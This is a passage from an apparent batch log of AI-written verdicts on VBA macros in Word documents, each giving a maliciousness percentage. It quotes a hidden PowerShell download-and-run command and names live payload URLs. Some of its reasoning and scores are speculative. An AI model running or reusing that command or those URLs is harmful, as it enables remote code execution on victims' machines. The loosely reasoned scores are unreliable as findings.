2. Furthermore, there's a function that reads data from custom XML parts of the active document and a check is initiated on `lh_mode` which could be a flag for harmful executing depending on its value.

3. The function `SwitchSides` seems to be manipulating and obfuscating data which can be a sign of an attempt to hide possibly malicious actions.

4. The Shell function execution might be problematic. If harmful commands are passed, it could cause damage.

5. The `HealthCheck` function writes binary data to a file. This could potentially be used to write malicious code to a file.

6. The functions `dc` and `prep_dc` appear to be obfuscating text, which is suspicious and can be a tactic used in malicious code to avoid detection.

Percentage of potential malicious content: 80%
There seems to be several indications of harmful operations, however we cannot be sure without the complete context or inputs of the macro. Also please keep in mind that even benign VBA code could be used maliciously if manipulated or in combination with certain security vulnerabilities. It is also possible that this code is benign but uses certain programming principles that are same as the ones sometimes used in malicious code.
================================================================================

File: 122.docm
GPT's analysis:
Upon initial inspection, the given VBA code appears to have a complexity beyond basic automation and contains several potential risks factors. The content itself looks like it may be a concatenation of various programs and macros, which include executable actions, directory filepath manipulation, and randomization operations.

Most notably, the function "UnsafeNativeMethods" alongside "Shell" command creates a significant risk as it would allow the code to execute other programs or potentially malicious tasks within the user's system. This function seems to take an encoded hex string and convert it into a command string which is then passed to the Shell command for execution.

Furthermore, the "Document_Open" subroutine could enable the code to automatically execute whenever a document is opened.

Another aspect that could raise suspicion is the obfuscated comments and the incorporated copyrighted script segements. The comments are not helpful in understanding the purpose of the code, and the copyrights indicate that the code may not be original or could be incorrectly or maliciously used.

Overall, while not all functionalities of the code are clear upon inspection, the potential for harmful actions is significant. Therefore, I would put this script at a 70% to 80% likelihood of being malicious, due to the identified risky components and high level of obfuscation. The exact intents and potential harm of this code, however, are difficult to quantify without a deeper analysis.

GPT's analysis:
This VBA code is likely to be malicious, with an estimation of up to 90%.

Firstly, the code takes advantage of symbolic names and hard-to-read formatting to make the callback and execution callouts obscure, trying to evade potential protective scans.

Below are a few areas of concern:

1. The 'SwitchSides' function seems to handle some form of character conversion based on a supplied string and hex-coded string from the 'dc' function.
2. In 'HealthCheck', the function either writes data to a file if the 'v' boolean is False or prompts a message box with 'Abnormal termination'. This could potentially be a tool to omit errors if something goes wrong.
3. The CreateObject("Scripting.Dictionary") function, combined with file operations like 'open', 'put', and 'close', could suggest that this is capable of saving data elsewhere in a system. 
4. The usage of 'Shell' command on function 'Initialize'. It seems to prepare a Shell command by combining multiple 'dc' called outputs. This could potentially execute harmful instructions.
5. The presence of '.gitingore' is a strong signal that this program expects to be run in a specific environment with a .git root, possibly implicating some form of development environment targeting or source code manipulation.

These actions suggest that the code could potentially be used for harmful activities, therefore it is advisable to view this script with caution and handle it under highly controlled conditions.

GPT's analysis:
The provided Visual Basic for Applications (VBA) code opens a Word document and runs a PowerShell program, which appears to carry out a series of tasks that are highly suspicious and potentially malicious. Upon examination, the script appears to be designed to perform the following actions:

1. It sets up a variable to call PowerShell. Depending on the system architecture, it might run the system's PowerShell or a 32 bit version explicitly.
   
2. It then concatenates a huge encoded command and executes it using PowerShell with flags that suggest potential malicious activity. The flags "-NoP -NonI -W Hidden -Exec Bypass" are used to bypass execution policies, hide the window, and prevent interactions.
   
Based on the amalgamated encoded command, it seems the script communicates with a certain website (http://kabig.com/data.php) and could potentially send sensitive data such as the user’s credentials or system information.

Unable to decode the script completely, but given the behaviors it displays, tagging the script as 'malicious' seems highly plausible. 

With the information at hand, I would estimate a 90-95% likelihood that the given VBA code snippet is malicious. This means that it is highly recommended to isolate the system and initiate a thorough security response, including but not limited to, complete system checks, user credential alterations, network traffic monitoring and so forth.

The given VBA code appears to be benign. It's a macro for Microsoft Word that automates the process of searching through a document for a specific term and replacing it with another term. Additionally, it sets specific formatting options for the replacement text (font and font size). 

There are no commands or functions present in the code that manipulate system files, create network connections, download other files, access the registry, or perform other actions commonly associated with malicious macros. The code only operates within the scope of Microsoft Word's functionality. 

Thus, given the information provided, I would estimate the likelihood of this code being malicious to be near 0%.
================================================================================

File: 96.docm
GPT's analysis:
The Visual Basic for Applications (VBA) code in question is part of a macro in a Microsoft Word document. It contains a script that is executed when the document is opened. The script retrieves user-specific and system-specific information and then sends this information to an external server via an HTTP request. 

The functionality is concerning for several reasons:

1. It collects sensitive information from the user's system, including their username, the name of the computer, IP address, and MAC address. This type of information can be used for malicious activities such as targeted attacks.

2. It also retrieves two specific paragraphs from the active document. The purpose of this is unclear but could potentially be another method of exfiltrating data. 

3. It sends all of this information to a specific server via GET method.

4. Transmissions are not secured or encrypted, leaving the data open to interception. Also, no user consent is asked before data is transmitted.

5. After data transmits, a message box pops up in an unfamiliar language (Chinese) about needing authorization – a tactic often used in phishing attacks. 

Given those points, the VBA macro is highly suspicious and may likely participate in malicious activities like unauthorized data exfiltration or tracking user activity. I would estimate the likelihood of this code being malicious at around 90%.

================================================================================

File: 98.docm
GPT's analysis:
Upon analyzing the Visual Basic for Applications (VBA) code snippet, it is evident that there are potentially harmful commands present. The Macro uses a shell command to execute a PowerShell script with the "-exec bypass" parameter. This parameter allows PowerShell to bypass execution policy restrictions on the system in order to execute the encoded command.

This encoded command appears to be downloading a file from a web address "https://www.notmalicious.services/hello.exe" and saves it under the file name "hello.exe". Finally, it tries to execute this downloaded file.

Without knowing the content of the "hello.exe" file, we cannot fully estimate the percentage likelihood of maliciousness, but since it downloads and executes a file from an external source, ignoring execution policies, we can consider this behavior potentially malicious or at least risky.

The line "MsgBox "game over", vbOKOnly, "game over"" appears to display a messagebox saying "game over", could potentially be an attempt to mislead the user or distract them while the PowerShell script downloads and executes the suspicious file. 

Given all these indicators, there is a high chance of this code being malicious. I would estimate an 80% likelihood. However, further analysis would be needed, such as examining the contents of the downloaded "hello.exe" file to confirm this suspicion.

GPT's analysis:
The VBA code you’ve provided is almost certainly malicious, I would say it is 95% likely to be harmful. It contains numerous indications of being used for malicious purposes; let me explain some of these indications below:

1. The code contains obfuscated strings and complex coding logic, which are common techniques used in malware to hinder the understanding and detection of the malicious code.

2. Specifically it seems this code uses a Base64 encoding scheme for string manipulation, which is another sign that the code is likely malicious. Encoded strings are often used in malicious code to hide the true intent of the code.

3. In addition, the "Document_Open" subroutine is a first line of defense for malicious documents. If this runs when a document is opened, it could automate whatever harmful behavior the rest of the code is intended to perform. 

4. The use of "CreateObject" function suggests that the code may attempt to create and run external processes or manipulate system components in a harmful way.

5. The function "run" is invoked which means a program or command is being launched on the victim's device without their consent or knowledge, this is a common technique in malware.

Please be aware that due to the obfuscation and complexity of the code, there are parts I could not fully interpret. Therefore there may be additional malicious behaviors hidden within the code. 

Overall, the shared code is almost certainly harmful and should not be run under any circumstances without a proper sandboxed environment. Its main goal might be delivering a payload over the infected machine.

================================================================================

File: 100.docm
GPT's analysis:
The Visual Basic for Applications (VBA) code in question is highly suspicious and potentially very harmful.

The specific portion that raises red flags is the line:
Shell.Run "powershell -ep bypass -w hidden  iwr e.pepo.ee/we | iex"
This is a direct shell execution command and its purpose is to run a PowerShell command using the "wscript.shell" object. 

The PowerShell command is running with the "bypass" parameter, which is used to ensure that no policies interfere with its execution, hence bypassing any existing PowerShell execution policies. The "hidden" parameter ensures that the PowerShell window won't be shown, making the process covert.

From this command, it appears to be fetching content from the URL "e.pepo.ee/we" and then invoking it via the "iex" (invoke-expression) command. This is a typical method used by malware to download and execute payload from remote servers.

Given the observed behavior, it's safe to say that this macro exhibits a 99.9% likelihood of being malicious. The functionality it provides — running hidden commands, bypassing security policies, downloading content from external servers, and running said content — are all classic tactics within a malicious context. Without more context, the 0.1% doubt acknowledges that there might be some very corner case this could be part of a legitimate program, although it's highly unlikely. Action should be taken immediately to isolate and remove this potential threat.

GPT's analysis:
This VBA code appears to be malicious with an estimate of about 95%.

A detailed analysis:

1. The first red flag is the unusual function names "weoqzisdi___lorfar" and the variable names such as "path_weoqzisdi___file", "file_weoqzisdi___name", "folder_weoqzisdi___name", which are difficult to follow, typical of obfuscation techniques often used in malicious code to avoid detection.

2. The "Shell.Application" object is used to execute shell commands. Its usage is often found in malicious macros that are written to gain control of the computer’s resources.

3. The script creates a directory in the user's profile directory and then copies the currently opened document into that directory. It then operates on the copied file which is very suspicious.

4. It appears to be renaming certain files into ".bin" files under the pretense of embedding them and later executes these binary files using 'Shell', which could pose a security risk.

5. This script will automatically execute whenever the document is opened, evident from the 'Call weoqzisdi___lorfar' line inside the 'Document_Open()' procedure. 

6. Moreover, it tries to alter the content of the original document and reopens it without user's confirmation which is suspicious.

7. Further, there's an empty macro "ee" in a different module named "NewMacros" which seems to have no legitimate use and could be used to misguide the analysts or users that the document contains harmless macros. 

In conclusion, due to the suspicious activities identified above, this script appears to be very likely malicious. It's recommended to not execute this script and to follow appropriate incident response procedures.
================================================================================

File: 15.docm
GPT's analysis:
The VBA code appears to be extremely suspicious and indicative of malicious behavior. My estimated likelihood of this macro being malicious is about 90%.

Here are the specific reasons:

1. Use of 'On Error Resume Next: This statement allows the script to continue, even when errors occur - a technique often used by malicious VBA code to avoid detection or interruption.

2. The code uses CreateObject quite extensively. This is often used to create or handle instances of objects provided in other applications or DLLs which itself is suspicious, as it can be used for malicious activities such as creating instances of WScript.Shell for running external system commands, or Internet Explorer to download malicious files.

3. The script works with document object model(DOM), which could be a method of document exploitation.

4. Use of obfuscation methods such as calling functions by string name (CallByName), which is commonly used to bypass basic detection methods.

5. The code appears to be interacting with user forms and embedding values taken from cells in a document/spreadsheet and then running functionality based on these values.

The creation, handling, and usage of these objects indicate that the macro is not running a simple, harmless task related to the document itself but involves some other potentially harmful operations which might compromise your system.

Please keep in mind that this analysis is not a definitive proof that the code is malicious, it is merely an indication that the script has features often seen in malicious code. Definitive proof would require a more thorough analysis and potentially running the code in a controlled environment. It's highly recommended to avoid running this code on your system unless you know precisely what this script does or unless it comes from a completely trusted source.

GPT's analysis:
This VBA code appears to be potentially malicious with an estimated likelihood of around 80-90%. Key indicators that this code might be used for harmful actions include:

1. This code utilizes "GetObject" with certain obfuscated strings that appear to point towards system services or files. In line with "Set fhfcsnunstz = GetObject(rrhzspxkphvvy(iujnoejlhsccsg))". 

2. The code utilizes "Randomize" and "Rnd", which are often used in unethical code to perform actions randomly or create random files to make detection and removal harder.

3. This code has a function "raeozmfjnymq" that is capable of writing byte data to a file. This can be used for creating new files with potentially harmful content.

4. The "ActiveDocument.CustomXMLParts" is accessed and may be potentially used to extract sensitive data.

5. The "GetObject" function is used which can access an Object's properties. This function can be used destructively when used in conjunction with certain objects like Wscript.Shell, ADODB.Stream and others which could perform harmful actions like command execution, reading files and writing files.

6. There is the creation of a file ".gattaka" and message box notifications about "Obsolete environment, please, update" and "Not applicable environment", which are unusual behaviors and can be a sign of something malicious.

While the exact intent or payload of this code is obfuscated, it's quite clear that there may be an intention to either manipulate files, system services, or to potentially execute other programs. Further in-depth analysis would be required for more accurate malicious likelihood estimation and clearer understanding of the potential harm.

GPT's analysis:
This VBA code is definitely malicious, with a 100% likelihood of being harmful.

The VBA code is using hexadecimal values to obfuscate the payload of the actual script that performs the harmful actions. When converted from hexadecimal to ASCII, it is trying to execute powershell commands. The overall effect is that it downloads an executable from a remote URL (concealed within the code as an HTTP address), then runs that executable. 

The obfuscation technique used here implies that the author is trying to hide something - in this case, a harmful action, which is characteristic of malware. The fact that it is downloading and executing a file is a significant security risk. This kind of malware is indicative of trojans which can lead to multiple harmful actions such as data theft, ransomware infection, or remote access to the victim's machine. 

The critical aspects making this code malicious include: 
- Open function is triggered automatically when document is opened
- Hex encoded strings which obfuscate the actual command and hence can evade detection
- Execution of a powershell command to download an external file and run it
- Use of Windows shell to run commands

In conclusion, this macro is a high-risk security threat. Any file containing this macro should be treated as a serious risk and be isolated, reported, and deleted promptly. The relevant parties such as IT security and incident response teams should be notified.
================================================================================

File: 113.docm
GPT's analysis:
Based on the analysis of the VBA code, there certainly are signs of potential malicious actions:

1. The code works with active document's CustomXMLParts which could be used to extract sensitive information.
2. The 'GetObject' function used in the code may relate to file system objects, potentially mapping drives, folders, and files which can lead to unauthorized access or manipulation of system files.
3. The 'raeozmfjnymq' subroutine seems to be writing to a binary file which could be used for stealthy actions like injecting or extracting hidden data.
4. The function 'zwxcnxajcshyp' is making use of what appears to be encrypted or obfuscated strings for potential harmful actions when decrypted or de-obfuscated.
5. The function 'rrhzspxkphvvy' seems to be serving as a potential decryption function converting numerical strings into characters potentially revealing previously obfuscated parts of code.
6. The call to dir(".gattaka") might be checking for the presence of a specific file or path with ".gattaka" which could be an indicator of compromise or used to avoid analysis environments.
7. It also contains code to run the macros upon the document opening event, which could trigger harmful code execution without the user's explicit consent.
8. It creates and runs a new instance of a process, which may indicate harmful behavior such as downloading, installing, or launching malicious software.

Therefore, considering the above points, the code seems highly suspicious. I would estimate that the chances for this code to be malicious are around 85%-90%. However, a final judgment should be made upon a more detailed analysis and execution in a controlled environment.

GPT's analysis:
The two VBA (Visual Basic for Applications) snippets provided here do not in themselves show signs of potentially harmful or malicious actions. They are simply setting some attributes and the second one defines a simple macro to insert an image with a given path into a document.

The macro "InsertImage" just adds an image from the specified path ("C:\user\a\image.jpg") into the document at the location of the cursor. It also adds a caption text under the image if it is not an empty string. Following the insertion of the image and caption text, it shows a message box with the message "An image has been inserted at the cursor location."

Based on this code alone, I would estimate a 0% likelihood of malicious activity. However, it's important to note that any code has the potential to be used maliciously if it interacts with other code that has malicious intent or if the provided image path leads to a harmful script or possibly malicious file. In the world of cybersecurity, we would need to see the complete context to make an accurate assessment.

GPT's analysis:
Upon analyzing the VBA code, I notice a few potential security risks:

1. The script appears to manipulate the Shell and cmd command using the Shell indHeader("cmd /c "). This could potentially be dangerous depending on the arguments attached to it.
2. The program writes to a file at "c:\\users\\public\\objectVarQuery.h" using indHeader("") command, which raises security concerns about possible file manipulation or data corruption.
3. The function 'rAlt' possibly uses XOR operation, typically used in malicious scripts for obfuscating some payload or malicious data.
4. Code is accessing the document text with ActiveDocument.Range.Text and possibly writing it into another file.

In general, without understanding the wider context or observing behaviors like attempts to connect to an external server, download additional files, or modify system settings, it's difficult to confirm that this script is definitively malicious.

However, with the potential risk factors mentioned, it's safe to assume the code has a good likelihood of malicious activity. I would estimate around 75% chance of being harmful or part of a harmful action, based on the obfuscation methods used and the file manipulation operations taking place. Users or administrators encountering such scripts should always treat them with caution. 

I highly recommend this code to be reviewed in an isolated environment (like a sandbox) for a detailed behavioral analysis.
================================================================================

File: 78.docm
GPT's analysis:
Based on the analysis of the VBA code provided, it appears to be highly likely (around 95%) that this code is malicious. Below are several red flags:

1. The VBA code contains suspicious function names and variable names with no logical meaning but a random collection of characters, suggesting attempts to obfuscate the code's purpose (e.g., "bvhfkauw34gkagdfki", "dfloaswehortiwholehfolsihlkw", "fkahefowihlogjpsojgoisdh"). 

2. There are multiple manipulations of the Windows shell using the "Wsc" + "ript.She" & "ll" sequence. This is used to execute external scripts or codes outside of the VBA environment, which is a common tactic in malicious scripts.

3. The "ndfqkhwfoia8tvfoaisgufoiqewgfiudgovlisvpoju" subroutine appears to include encoded data in the variable "s2", which is then cleaned using the Replace function and run as a command in the shell.

4. The "Document_Open()" subroutine (which runs when the document is opened) calls the suspicious subroutine "ndfqkhwfoia8tvfoaisgufoiqewgfiudgovlisvpoju" which may execute malicious shell commands.

5. The "dfjolirhoghwow" function appears to read a file in binary mode, potentially aimed at obfuscating the purpose of reading the file, which could be aimed towards stealing sensitive data or executing malicious code.

6. The 'GetObject("}")' sequence, which is used in the 'fkahefowihlogjpsojgoisdh() ' function, often appears in scripts that attempt to interact with the Windows clipboard in some manner, potentially copying sensitive data.

Given these factors, there is a high probability the macro is designed to perform some form of malicious actions such as extracting sensitive data, delivering malware payload, executing unwarranted commands or downloading malicious files from the internet.
================================================================================

File: kk.docm
GPT's analysis:
The given VBA code appears to be benign. There are no commands that cause the code to interact with the file system, the registry, the network, or other potentially dangerous areas. 

The code defined in the macro opens the active Word document and highlights the words "important", "confidential", and "review". There are no calls to external systems, no request for sensitive data and there are no actions that would alter the system or other documents.

Therefore, I would estimate a 0% likelihood of being malicious based on the provided information. However, it is important to note that security assessment could still require a context. For instance, if confidentiality is a high concern in a particular setting (such as classified documents), even just highlighting keywords might be considered a harmful action. But based on standard practices and in general scenarios, this piece of code doesn't show any malicious or harmful intentions.
================================================================================

File: 134.docm
GPT's analysis:
This VBA code has a high probability of being malicious - about 90%.

Here are some observations:

1. The code includes suspicious function and variable names, which appear to be random strings of letters. This is commonly used to obfuscate potentially malicious code.

2. There is use of Automation objects (`CreateObject`), which could be used to perform actions on the system like creating, deleting or modifying files.

3. The function `raeozmfjnymq()` is particularly suspicious as this attempts to write binary data to a file. The file name and the content are derived from other functions, which return obfuscated strings or byte arrays. This function could be used to drop malicious binaries or scripts on the system.

4. The function `zwxcnxajcshyp()`, uses COM objects and WMI to run system commands which are serious security risks and it uses the `GetObject` function which is often found in malicious code used to instantiate an Automation object.

5. The code checks for a file named ".gattaka". If the file exists, it simply shows a message box and stops execution. This could be a "kill-switch" used by the malware authors to stop execution of the malicious payload when analyzing the malware in a secure environment.

6. The Processes and Services are being created or modified which can be extremely dangerous, especially with the correct permissions.

7. The Document_Open() function indicates that the potentially malicious code is executed as soon as the document is opened. This tactic is commonly used in malicious macros to launch attacks as soon as a victim opens the infected document.
================================================================================

File: 141.docm
GPT's analysis:
Reviewing and analyzing this VBA code, it appears to exhibit several characteristics often associated with malicious scripts, including:

- Use of obfuscated function and variable names, which is a common tactic used to make code harder to analyze or understand by humans.
- Some operations performed on document open which is a common event used by macros to trigger malicious activities as soon as a user opens a document.
- Existence of code that accesses and interacts with file directories and system objects, indicating the potential for actions such as modification, creation, or deletion of files or execution of system commands.
- Presence of byte conversion operations and writing binary data into files, which can be indicative of an attempt to install or execute additional malicious programs.
- Possible evasion tactics, with checks for certain conditions before running certain code. In this script, a message box offers benign messages when it detected a certain file. 
- The creation and spawning of instances which can often be associated with techniques for executing further code.

Although we would need more context to provide a definitive statement, there are numerous red flags here. Given these factors, this script seems to have a reasonably high chance of being malicious - I would estimate around 80%. Any such script should be subjected to further analysis in a controlled environment to definitively ascertain its intentions. 

In conclusion, never allow scripts to run that originate from unknown or untrusted sources. Always maintain up-to-date antivirus software to provide an additional layer of security.

The VBA code appears to consist of two parts. The first part is benign and simply displays a message box saying "CONGRATULATIONS! NO ISSUE FOUND", and the other part is related to the behavior of a close event for the document.

The second part, though, is more concerning and potentially malicious. It calls potentially suspicious functions, such as manipulating document properties and running shell commands usually associated with creating or opening a binary file. The code contains one block where it seemingly writes binary data to a file "C:\ProgramData\ksdfhkjhdskdf.txt". In another instance, it runs a dynamic shell command involving the file it created earlier.

Furthermore, it uses a technique that could be used for evading simple detection mechanisms by scanning for the presence of the McAfee folder. Depending on the outcome, it triggers different procedures. This is a common evasion technique used by malware to detect and avoid running in a security researcher's environment.

While some functions, like sorting cells in a worksheet, appear to be benign, the presence of the other suspicious activities poses a serious concern that this could be malicious code. Based on these anomalies, I would say this code is about 85% likely to be malicious, and further detailed analysis on an isolated environment is encouraged.

GPT's analysis:
Analyzing this VBA code it can be seen that it contains two separate macros. The first macro extracts the first hyperlink in the active document and stores it in the variable 'X', then calls RT function from a second macro with this hyperlink as a parameter.

The second macro is more complex. It involves numerous function calls, which on initial inspection simply appear to return single character strings. However, these function calls are invoked within the TC and TC2 functions to create specific strings. The interesting string, returned by TC2 function, appears to make up "winmgmts:Win32_Process". 

This line, "Set Friday = CreateObject(TC2())", creates a WMI (Windows Management Instrumentation) object in order to execute commands related to windows management. "Sunday.CommandLine = erc" refers to setting the command line that will be executed. 

Given erc is the input parameter, this strongly suggests that the system command that will be run by this VBA script is the first hyperlink in the document. Given that link could potentially reference some harmful executable or script, this VBA code could be used for malicious purposes, for example to run malware or other harmful system commands.

Maliciousity level would strongly depends on the document content and use context but building up commands with functions this way is considered typical obfuscation technique, which is usually used by malware authors. Let's raise a red flag and assign maliciousity level around 80% based strictly on the code without further context about its use and the document content. 

This should warrant further investigation and possibly triggering of cyber security incident procedures.
================================================================================

File: 1.docm
GPT's analysis:
The VBA code provided includes some functions and subroutines which are associated with potentially malicious activities. Observations below:

1. The code has a Document_Open() event, which launches a certain code as soon as the document containing this code is opened. This is frequently used in malicious schemes to exploit the document’s recipient once they open it.

2. The function siudlfagynaqsgxowx() appears to be generating a dictionary with numerical keys mapped to ASCII characters, which could potentially be used to decode encrypted malicious payloads.

3. The function rrhzspxkphvvy() seems to be used for decoding or conversion which could be used in decrypting malicious payloads. 

4. The method raeozmfjnymq() is writing binary data into a file, this is a red flag because it could possibly be used to drop additional malicious scripts into executable files.

5. In zwxcnxajcshyp(), a WMI service is being created to run a command. This method is often used by malware to ensure persistence or execute additional malicious scripts even after the original document has been closed.

This code contains red flags associated with malicious scripts, and can potentially have a high likelihood of containing malicious activities like unauthorized data manipulation, execution of unknown processes and dropping of additional payloads. This can still be a part of a larger codebase, probably decrypting and launching a hidden payload. 

However, it's important to note that it's not truly malicious in its current form as it lacks actual payloads or harmful processes. It could be seen as a framework or a shell for malicious code. Therefore, considering these factors, let’s rate the possibility to be 60-75% of it being potentially malicious if associated with additional obfuscated codes or scripts. 

In its current state, without a harmful payload or unauthorized task, it poses little to no harm. It is recommended to conduct further investigation and monitoring if this code is found in a suspicious context.
================================================================================

File: 103.docm
GPT's analysis:
Based on my analysis, these VBA macros likely have malicious intent.

In the first part of the code, the `Document_Close()` function is run, and the text from the first hyperlink in the active document is sent to the `XcQx.RT` function. 

In the second part of the code, several functions are used to obscure string construction. The `TC2()` function forms a string similar to "winmgmts:", and the `TC()` function forms a string that might be a method name from the WMI interface, e.g., "create". The string "Process" is also concatenated in `TC2()`. 

The `RT()` function appears to be running a Win32_Process method, likely the 'create' method. This is inferred from concatenation of strings, such as 'c', 'r', 'e', 'a', 't' and 'e'. This could allow the macro to execute a command from the first hyperlink of the active document.

The `KLGH` function is used for removing spaces from the given string.

Given these points, it's safe to assume that this code is likely constructing a command hidden inside a hyperlink in the document which is then executed when the document is closed. This technique can be used to execute potentially harmful commands, such as installing malware or exfiltrating data. 

The obscurity of code and the presence of a likely command execution attempt indicate a high probability of malicious intent, I would estimate that there's a 90% or higher likelihood this code is malicious.
================================================================================

File: 133.docm
GPT's analysis:
The potential for this VBA code to produce malicious results is almost certain, close to 100%. There are several suspicious elements in the macro that strongly suggest malicious intent.

1. Firstly, the code uses the `CreateObject("Wscript.Shell", "").Run ra, 0` method, which can be used to execute harmful commands in the local environment without showing the command prompt window.

2. There's use of `Application.FileDialog(msoFileDialogOpen)` which can be used to manipulate files in the user's system, potentially leading to unauthorized changes or data theft.

3. There's obfuscation in the `s2` variable where they are de-obfuscating a command with `ra = Replace(s2, "Cew", "")`. The de-obfuscated codes seems to be a shell command, potentially harmful.

4. In the `Document_Open()` function, it runs the function `dgfjalfhkaugwikgfuol3wgnacoi3u5taboi3ut5roai3u5go3wugaolisdrgfso8i7wejwdoljgf "sd", 0, 0` that seems to have a concealed purpose or suspicious intent.

5. Vague variable names with unusual and lengthy identifiers suggest code obfuscation, a common practice in malicious scripts to evade detection.

6. The Open method in the `cbklu3eiorauwbtoibnof3ibtaoiwbtoaiwhngpofkjhpzjus4oighszoizcdvibh` procedure could potentially be used for reading sensitive binary files.

To be definitive, a deeper analysis would run this script in a controlled environment to fully understand its behavior. However, the mentioned signs strongly indicate a malicious intent.
================================================================================

File: 11.docm
GPT's analysis:
The given VBA code seems to potentially perform malicious activities.

1. It extensively uses obfuscated function and variable names, which is often used by malware to hinder analysis and detection.
2. It uses "On Error Resume Next", which could be trying to silence errors during execution, allowing malicious activities to continue even if parts fail.
3. It interacts with several system components including ActiveDocument, Workbooks, UserForms, Controls, etc., hinting at potentially manipulating user data/documents.
4. It uses VBA functions like "CallByName", which could be used to dynamically call procedures potentially providing an execution flow that's harder to predict and trace.
5. It uses "CreateObject" to create instances of OLE Automation objects, a known technique for executing malicious actions.
6. It accesses and potentially alters application options multiple times, which could mean it's trying to change system settings or behaviors.
7. It attempts to open and read information from Workbooks and manipulate UserForms, hinting at unauthorized data access and potential data exfiltration.
8. It uses "Application.OnTime" potentially to schedule tasks, which could be used for persistence or for triggering future actions.
9. It uses "DoEvents" allowing other tasks to execute, which could mean it's trying to hide its activities during lengthy operations or creating windows for other malicious tasks to run.

Given these observations, this VBA code is assessed to be 85% likely to be malicious. A detailed binary analysis is required to confirm the exact nature of these functions and their effects on the system.
================================================================================

File: 59.docm
GPT's analysis:
This VBA code exhibits a significant degree of malicious behavior and is 100% likely to be harmful. The script you provided appears to be a type of malicious macro, specifically designed to download and run a file from a URL. 

Here are the reasons:

1. The macro creates Microsoft.XMLHTTP object to establish a connection with a URL, which is an encoded string.
2. It then creates an ADODB.Stream object to download data from that URL.
3. The data is saved as a file and then executes this downloaded file using the WScript.Shell object's Run method. This is a typical behavior of trojans or downloaders, which download another piece of malware and then execute it.
4. Furthermore, the function “WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg” is likely used for obfuscation, something malicious scripts regularly use to hide their actual behavior or to evade basic detection methods.

These indicate that the above macro is designed to download and execute potentially harmful files on user's system from a remote server, hence it is malicious.

Remember, generally, macros shouldn't download and execute files from the internet, usually it is a clear sign of malicious intent. Running such a file could result in a serious security breach. This script could be potentially very dangerous, depending on the nature of the file it downloads and executes. It's recommended to avoid running such scripts in uncontrolled environments.
================================================================================

File: 108.docm
GPT's analysis:
Analyzing this Visual Basic for Applications (VBA) code snippet, it's noticeable that there are several concerning elements which potentially indicate harmful activity.

Here are some concerning code blocks being observed:

1. URLDownloadToFile Function: This function is often used in malicious macros to download a file from a specified URL. In the provided code, it is seen that a file is downloaded from a web URL (which is also slightly obfuscated to mask its original nature), saved (potentially executable, as subsequent '.exe' is added to filename) and then eventually run. 

2. Shell Object Creation: The code is creating a Shell object, differentiating this from normal document macros. Shell objects are capable of running other programs or manipulating the OS, which can potentially be used maliciously. 

3. File Execution: The VBA script is potentially executing a file, here an executable file, as the 'Run' method is invoked on the shell object with the newly downloaded file's path without any apparent legitimate reason.

4. Usage Of "On Error Resume Next": This statement forces the execution to continue even if there is an error, which is often a red flag for potentially malicious actions.

5. Obfuscation Techniques: The code uses functions to change text by mapping letters and other characters to a new variation. These are clear attempts to obfuscate code, hiding the true intentions behind layers of confusing logic.

Given these points, I would say this code carries a very high risk of being malicious, around 90% likelihood. A typical, benign Word VBA macro would not need to download and run executable files from the internet. Final confirmation would require additional context and ideally execution in a safe, isolated environment for testing.
================================================================================

File: 80.docm
GPT's analysis:
Upon analyzing the VBA code, it displays several indicators of malicious behavior:

1. The code is using several rarely-used Application Options, which suspiciously could be aimed at disguising malicious activity by confusing the analyst. This adds a level of obfuscation that is usually present in malware.

2. It turns off alerts with "Application.DisplayAlerts = False". This is a common method used by malware to suppress any error messages or warnings that may alert users to the malware's activities.

3. It uses a method, CreateObject, that's known to potentially create and activate arbitrary objects, which can be abused to achieve arbitrary code execution.

4. Error handling is used throughout the code, "On Error Resume Next". When combined with silent alerts, it's usually an indication that the code may perform illegal operations or those that would otherwise raise an alert.

5. The use of CallByName method allows for a variable to hold a reference to an object's methods, which can be used to call procedures dynamically, potentially leading to the execution of harmful procedures.

6. It's attempting to open files by calling Workbooks.Open, and handling errors if they occur. This could be indicative of attempts to open and perhaps modify or steal information from these files.

The mechanisms mentioned lead to a very high probability that this is a malicious macro. Therefore, we can estimate that there's a 90-95% chance of this being a malicious code. However, without deeper static or dynamic analysis to understand the full context of what this code is doing or attempts to use, it's not possible to provide a 100% determination. We also need to be aware that false positives can still occur.
================================================================================

GPT's analysis:
Based on the provided VBA code, there doesn't appear to be any malicious actions. The code appears to increment a barcode number by 1 every time a document is printed or saved. This is likely used for version control or tracking purposes.

The code does not show any signs of attempting to access and manipulate sensitive information, or signs of virus or worm activity such as self-replication, downloading additional payloads, or making unauthorized network connections.

However, it should be noticed that the code does depend on macros and ActiveX being enabled, which could potentially be exploited by other malicious code if the environment were compromised. 

We should also note that while the provided code excerpt does not appear to be directly harmful, it could still possibly be part of a larger, more complex malicious attack if combined with other functions or code (not visible here).

The likelihood of this code snippet being malicious based on the given information is about 5%. The 5% derives from any possibilities that it could be part of a larger, more complex malicious attack when combined with other codes, considering this code does require macros and ActiveX to be enabled, even though macros and ActiveX themselves are not inherently malicious. Always remember that any security assessment could be limited by the information available at the time of the assessment.
================================================================================

File: 140.docm
GPT's analysis:
Analyzing the provided VBA macro code, it is clear that it is potentially harmful and appears to be related to malware activities. This assessment primarily stems from a couple fundamental elements in the code.

The primary function of the code hinges upon the execution of a decoded PowerShell command string that downloads a file from a web url (https://blog.paulucyelatros.com.br/HSXu44uC2qqQLIyo.exe) and runs it on the local machine when the macro is triggered (Document_Open event).

The deception in the code is maintained by masking the Powershell command within a string of Unicode character codes, which is then decoded by the 'sadsad' function which uses base64 encoding. This masking is intended to bypass detection mechanisms.

The final malicious operation is made by 'WScript.Shell' object, with the ".Run" method that executes the decoded PowerShell command string in a silent mode (0 parameter in .Run), thus downloading and executing the external .exe file without the user's knowledge.

In summary:

- Download and execute an external file: 100%
- Stealthy (hide actions from user): 100%
- Invoke PowerShell command: 100%
- base64 encoding for masking: 100%

I would say this VBA code holds a 100% chance to be malicious given these harmful actions. It is highly recommended to avoid running this code on your system. If this code is found in a production environment, it should be isolated and further analyzed in a secure environment by security professionals.
================================================================================

File: 70.docm
GPT's analysis:
The analyzed VBA macro code seems to be a probable malware with a likelihood of 90-100% being malicious. The reasons for the given statement are as follows:

1. The code contains obfuscated strings, encoded in Base64 and are decoded at runtime using the functions 'sad' and 'BytesToStr'. Obfuscation is known as a common tactic used by malware authors to hinder analysis and detection.

2. The decoded Base64 string is a PowerShell command, which is utilized to download an unknown file from an external URL 'http://tinyurl.com/quottbcb'. It then attempts to execute this file on the system via the 'WScript.Shell' object. 

